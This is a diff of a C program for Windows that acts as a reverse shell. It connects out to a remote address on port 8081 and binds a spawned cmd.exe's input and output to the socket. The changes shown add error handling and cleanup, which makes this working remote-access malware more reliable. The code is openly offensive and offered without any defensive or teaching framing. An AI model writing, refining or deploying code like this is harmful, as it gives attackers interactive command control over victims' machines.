@@ -17,32 +17,57 @@ int main()
     int port = 8081;
     char RecvServer[512];
 
+    // initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        printf("(!) Failed to initialize Winsock\n");
+        return 1;
+    }
 
-    WSAStartup(MAKEWORD(2, 2), &wsa); //initializing winsock
-    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); //creates a TCP socket
+    // create a TCP socket
+    if ((shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET) {
+        printf("(!) Failed to create socket\n");
+        WSACleanup();
+        return 1;
+    }
 
+    // set up the socket address structure
     shell_addr.sin_port = htons(port);
     shell_addr.sin_family = AF_INET;
     shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
 
-    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); //connect to server
-    if(connection == SOCKET_ERROR)
+    // connect to the server
+    if ((connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL)) == SOCKET_ERROR)
     {
         printf("(!) Connection to the target server failed\n");
-        exit(0);
+        WSACleanup();
+        return 1;
     }
 
-    else
+    // receive the server's welcome message
+    recv(shell, RecvServer, sizeof(RecvServer), 0);
+
+    // set up the STARTUPINFO structure for spawning a command prompt window
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // pipes stdin, stdout and stderr to socket
+
+    // spawn cmd.exe process
+    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL,&si, &pi))
     {
-        recv(shell, RecvServer, sizeof(RecvServer), 0);
-        memset(&si, 0, sizeof(si));
-        si.cb = sizeof(si);
-        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; //pipes stdin, stdout and stderr to socket
-        CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL,&si, &pi); //spawns cmd window
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        memset(RecvServer, 0, sizeof(RecvServer));
+        printf("(!) Failed to spawn cmd.exe process\n");
+        WSACleanup();
+        return 1;
     }
+
+    // wait for the cmd.exe process to terminate
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // clean up resources
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    memset(RecvServer, 0, sizeof(RecvServer));
+    WSACleanup(); // clean up Winsock resources
+
+    return 0;
 }
